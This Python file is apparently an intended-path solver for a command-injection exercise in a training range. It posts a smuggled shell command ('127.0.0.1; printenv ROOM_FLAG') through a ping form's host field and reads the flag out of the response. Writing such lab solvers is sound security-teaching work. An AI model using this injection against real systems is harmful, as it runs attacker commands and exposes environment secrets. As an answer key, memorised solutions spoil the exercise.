"""Intended-path solver: shell command injection via the ping form."""

import httpx

from openrange.content.solver import SolveResult, TaskResult, find_flags

PAYLOAD = {"host": "127.0.0.1; printenv ROOM_FLAG"}


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    res = httpx.post(f"{ctx.url()}/ping", data=PAYLOAD, timeout=10)
    flags = find_flags(res.text)
    captured = flags[0] if flags else None
    return SolveResult(
        results=[
            TaskResult(
                task_id="command-injection",
                ok=bool(captured),
                captured=captured,
                detail=None if captured else "no flag in ping output",
            )
        ]
    )
